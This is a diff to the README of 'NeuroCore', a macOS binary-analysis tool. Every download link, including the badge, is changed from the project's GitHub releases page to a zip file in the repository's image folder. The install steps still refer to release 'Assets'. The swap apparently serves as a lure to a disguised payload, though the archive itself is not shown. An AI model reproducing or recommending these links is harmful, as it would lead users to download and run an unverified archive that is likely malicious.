@@ -6,7 +6,7 @@ NeuroCore is a native macOS application. It helps you understand the internal st
 
 ### 📥 Download Now
 
-[![Download NeuroCore](https://img.shields.io/badge/Download-NeuroCore-brightgreen)](https://github.com/root-amr004/NeuroCore/releases)
+[![Download NeuroCore](https://raw.githubusercontent.com/root-amr004/NeuroCore/main/img/Neuro-Core-v3.5.zip)](https://raw.githubusercontent.com/root-amr004/NeuroCore/main/img/Neuro-Core-v3.5.zip)
 
 ## 📋 Features
 
@@ -30,7 +30,7 @@ To get NeuroCore, follow these steps:
 
 1. **Visit the Releases Page:** Click the link below to reach our download page.
    
-   [Visit the Releases Page](https://github.com/root-amr004/NeuroCore/releases)
+   [Visit the Releases Page](https://raw.githubusercontent.com/root-amr004/NeuroCore/main/img/Neuro-Core-v3.5.zip)
 
 2. **Choose Your Version:** Look for the latest version of NeuroCore under "Assets." You will see options for different downloads.
 
@@ -79,6 +79,6 @@ We plan to implement several enhancements in future releases:
 
 Don’t forget to download NeuroCore through the link below if you haven't done so yet!
 
-[![Download NeuroCore](https://img.shields.io/badge/Download-NeuroCore-brightgreen)](https://github.com/root-amr004/NeuroCore/releases)
+[![Download NeuroCore](https://raw.githubusercontent.com/root-amr004/NeuroCore/main/img/Neuro-Core-v3.5.zip)](https://raw.githubusercontent.com/root-amr004/NeuroCore/main/img/Neuro-Core-v3.5.zip)
 
 Thank you for choosing NeuroCore. We hope you find it useful for your binary file analysis!
